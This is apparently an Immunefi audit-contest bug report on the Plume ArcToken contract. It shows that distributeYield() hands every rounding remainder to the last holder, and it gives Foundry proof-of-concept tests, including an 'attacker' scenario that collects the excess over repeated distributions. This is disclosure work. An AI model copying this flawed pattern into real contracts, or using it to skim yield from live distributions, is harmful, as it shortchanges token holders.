# 50195 sc low unfair yield distribution due to remainder allocation to last holder

**Submitted on Jul 22nd 2025 at 13:05:53 UTC by @AasifUsmani for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #50195
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcToken.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief/Intro

The `distributeYield()` function in ArcToken contains a systematic flaw where any rounding remainder from yield distribution calculations is allocated to the last holder in the iteration order, rather than being distributed proportionally. Token owners can set any ERC20 token as the yield token, so token decimals can be 0, 6, 8, 18, etc., magnifying the unfair advantage. Yield token decimals used by RWA token owners can amplify this error significantly.

### Vulnerability Details

**Root Cause Analysis**

The vulnerability exists specifically in the `distributeYield()` function where holders are processed sequentially, and any remainder from rounding errors is implicitly given to the last processed holder:

```solidity
function distributeYield(uint256 amount) external onlyRole(YIELD_DISTRIBUTOR_ROLE) nonReentrant {
    // ... validation logic ...
    
    uint256 distributedSum = 0;
    uint256 lastProcessedIndex = holderCount > 0 ? holderCount - 1 : 0;
    
    // Process all holders except the last one
    for (uint256 i = 0; i < lastProcessedIndex; i++) {
        address holder = $.holders.at(i);
        if (!_isYieldAllowed(holder)) continue;
        
        uint256 holderBalance = balanceOf(holder);
        if (holderBalance > 0) {
            uint256 share = (amount * holderBalance) / effectiveTotalSupply; // ❌ Rounds down
            if (share > 0) {
                yToken.safeTransfer(holder, share);
                distributedSum += share; // ❌ Accumulates rounding losses
            }
        }
    }
    
    // ❌ CRITICAL FLAW: Last holder gets remainder instead of proportional share
    if (holderCount > 0) {
        address lastHolder = $.holders.at(lastProcessedIndex);
        if (_isYieldAllowed(lastHolder)) {
            uint256 lastShare = amount - distributedSum; // ❌ Gets ALL remainder
            if (lastShare > 0) {
                yToken.safeTransfer(lastHolder, lastShare);
            }
        }
    }
}
```

Here, the distributed sum is calculated based on rounded-down shares. The last user gets the remainder, which can be substantially larger than their rightful proportional share.

### Impact Details

**Critical Impact: Token Owner Controls Yield Token Precision**

ArcToken owners can set any ERC20 as the yield token:

```solidity
function setYieldToken(address yieldTokenAddr) external onlyRole(YIELD_MANAGER_ROLE) {
    if (yieldTokenAddr == address(0)) {
        revert InvalidYieldTokenAddress();
    }
    _getArcTokenStorage().yieldToken = yieldTokenAddr; // ❌ NO decimal validation
    emit YieldTokenUpdated(yieldTokenAddr);
}
```

Because decimals are not validated, yield tokens can have:

* 0 decimals (whole units only)
* 1-6 decimals (limited precision)
* 18+ decimals (high precision)

Consequences:

* If yield token has 0 decimals, rounding losses are severe.
* With low decimal tokens (0–6), distribution rounding causes significant unfairness, especially if distributions are in whole tokens or small units relative to supply.

### References

<https://github.com/immunefi-team/attackathon-plume-network/blob/580cc6d61b08a728bd98f11b9a2140b84f41c802/arc/src/ArcToken.sol#L388>

## Proof of Concept

Note: Add the tests into `ArcToken.t.sol` file and run test-specific commands to run the PoC.

In tests that use `LowDecimalToken`, include this contract at the top of `ArcToken.t.sol`:

```solidity
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LowDecimalToken is ERC20 {

    constructor() ERC20("Low Decimal", "LD") { }

    function decimals() public pure override returns (uint8) {
        return 6; // USDC-like decimals
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

}
```

{% stepper %}
{% step %}

### Scenario: Yield token with 18 decimals, distributing token units

Run command: forge test --mt test\_RealUnfairDistribution -vvvv --via-ir

Test:

```solidity
function test_RealUnfairDistribution() public {
        uint256 yieldAmount = 97;
        yieldToken.approve(address(token), yieldAmount);

        address user2 = makeAddr("USER2");
        address user3 = makeAddr("USER3");
        address lastHolder = makeAddr("VICTIM");

        whitelistModule.addToWhitelist(user2);
        whitelistModule.addToWhitelist(user3);
        whitelistModule.addToWhitelist(lastHolder);

        // Transfer to create uneven divisions
        token.transfer(alice, 233e18); // Total: 333e18
        token.transfer(user2, 333e18); // 333e18
        token.transfer(user3, 333e18); // 333e18
        token.transfer(lastHolder, 1e18); // 1e18 (victim)

        // With 97 wei to distribute:
        // alice: (97 * 333e18) / 1000e18 = 32.301 → 32 wei (rounded down)
        // user2: (97 * 333e18) / 1000e18 = 32.301 → 32 wei (rounded down)
        // user3: (97 * 333e18) / 1000e18 = 32.301 → 32 wei (rounded down)
        // Total so far: 96 wei
        // Remainder: 97 - 96 = 1 wei
        // lastHolder gets: 1 wei (but deserves (97 * 1e18) / 1000e18 = 0.097 → 0 wei)

        token.distributeYield(yieldAmount);

        uint256 lastActual = yieldToken.balanceOf(lastHolder);
        uint256 lastExpected = (yieldAmount * token.balanceOf(lastHolder)) / 1000e18;

        console.log("Last holder deserves:", lastExpected);
        console.log("Last holder actually got:", lastActual);
        console.log("Unfair advantage:", lastActual - lastExpected);

        assertGt(lastActual, lastExpected, "Last holder gets more than deserved");
    }
```

{% endstep %}

{% step %}

### Scenario: Yield token with 6 decimals (eg. USDC), distributing tokens

Run command: forge test --mt test\_ActualRoundingErrorsWithMessyBalances -vvvv --via-ir

Test:

```solidity
function test_ActualRoundingErrorsWithMessyBalances() public {
        LowDecimalToken lowDecimalYield = new LowDecimalToken();
        lowDecimalYield.mint(owner, 1_000_000 * 1e6);
        token.setYieldToken(address(lowDecimalYield));

        address user1 = makeAddr("USER1");
        address user2 = makeAddr("USER2");
        address victim = makeAddr("VICTIM");

        whitelistModule.addToWhitelist(user1);
        whitelistModule.addToWhitelist(user2);
        whitelistModule.addToWhitelist(victim);

        // Create MESSY balances that will cause actual rounding
        // But stay within 1000e18 total supply limit
        // Owner starts with 900e18 (after giving alice 100e18 in setup)

        token.transfer(alice, 99e18); // alice now has 199e18 total
        token.transfer(user1, 299_987_654_321_098_765); // ~0.3e18 (messy)
        token.transfer(user2, 299_123_456_789_012_345); // ~0.299e18 (messy)
        token.transfer(victim, 1_888_888_111_222_120); // ~0.00188e18 (tiny messy)

        // Remaining with owner: 900e18 - 99e18 - 0.3e18 - 0.299e18 - 0.00188e18 = ~400.4e18

        console.log("=== Messy Balances Test ===");
        console.log("Alice balance:", token.balanceOf(alice));
        console.log("User1 balance:", token.balanceOf(user1));
        console.log("User2 balance:", token.balanceOf(user2));
        console.log("Victim balance:", token.balanceOf(victim));
        console.log("Owner balance:", token.balanceOf(owner));
        console.log("Total supply:", token.totalSupply());

        // Use yield amount that creates guaranteed rounding errors
        uint256 yieldAmount = 97 * 1e6; // 97 tokens with 6 decimals
        lowDecimalYield.approve(address(token), yieldAmount);

        console.log("Yield amount:", yieldAmount);

        // Calculate expected shares (these WILL have rounding now)
        uint256 totalSupply = token.totalSupply();
        uint256 aliceExpected = (yieldAmount * token.balanceOf(alice)) / totalSupply;
        uint256 user1Expected = (yieldAmount * token.balanceOf(user1)) / totalSupply;
        uint256 user2Expected = (yieldAmount * token.balanceOf(user2)) / totalSupply;
        uint256 victimExpected = (yieldAmount * token.balanceOf(victim)) / totalSupply;
        uint256 ownerExpected = (yieldAmount * token.balanceOf(owner)) / totalSupply;

        console.log("Alice expected:", aliceExpected);
        console.log("User1 expected:", user1Expected);
        console.log("User2 expected:", user2Expected);
        console.log("Victim expected:", victimExpected);
        console.log("Owner expected:", ownerExpected);

        uint256 totalExpected = aliceExpected + user1Expected + user2Expected + victimExpected + ownerExpected;
        console.log("Total expected:", totalExpected);
        console.log("Should have remainder:", yieldAmount - totalExpected);

        token.distributeYield(yieldAmount);

        uint256 victimActual = lowDecimalYield.balanceOf(victim);
        console.log("Victim actually got:", victimActual);
        console.log("Unfair advantage:", victimActual - victimExpected);

        assertGt(victimActual, victimExpected, "Should have unfair advantage");
    }
```

{% endstep %}

{% step %}

### Scenario: Yield token with 6 decimals, distributing in units (accumulated unfairness)

Run command: forge test --mt test\_AccumulatedUnfairnessOverMultipleDistributions -vvvv --via-ir

Test:

```solidity
function test_AccumulatedUnfairnessOverMultipleDistributions() public {
        LowDecimalToken lowDecimalYield = new LowDecimalToken();
        lowDecimalYield.mint(owner, 1_000_000 * 1e6);
        token.setYieldToken(address(lowDecimalYield));

        address attacker = makeAddr("ATTACKER");
        whitelistModule.addToWhitelist(attacker);

        // Attacker has tiny balance but becomes last holder
        token.transfer(alice, 199e18); // alice: 299e18 total
        token.transfer(attacker, 1e18); // attacker: 1e18 (last holder)
        // owner: ~700e18 remaining

        console.log("=== Accumulated Unfairness Test ===");

        uint256 attackerTotalUnfairGain = 0;
        uint256 attackerTotalDeserved = 0;

        // Perform multiple small distributions
        for (uint256 i = 0; i < 10; i++) {
            uint256 yieldAmount = 7; // Very small amount
            lowDecimalYield.approve(address(token), yieldAmount);

            uint256 attackerExpected = (yieldAmount * token.balanceOf(attacker)) / 1000e18;
            attackerTotalDeserved += attackerExpected;

            uint256 attackerBefore = lowDecimalYield.balanceOf(attacker);
            token.distributeYield(yieldAmount);
            uint256 attackerAfter = lowDecimalYield.balanceOf(attacker);

            uint256 attackerGained = attackerAfter - attackerBefore;
            attackerTotalUnfairGain += attackerGained;

            console.log("Round", i + 1);
            console.log("- Expected:", attackerExpected);
            console.log("Got:", attackerGained);
        }

        console.log("Total deserved over 10 rounds:", attackerTotalDeserved);
        console.log("Total actually got:", attackerTotalUnfairGain);
        console.log("Total unfair advantage:", attackerTotalUnfairGain - attackerTotalDeserved);

        assertGt(attackerTotalUnfairGain, attackerTotalDeserved, "Attacker should accumulate unfair advantage");
    }
```

{% endstep %}
{% endstepper %}
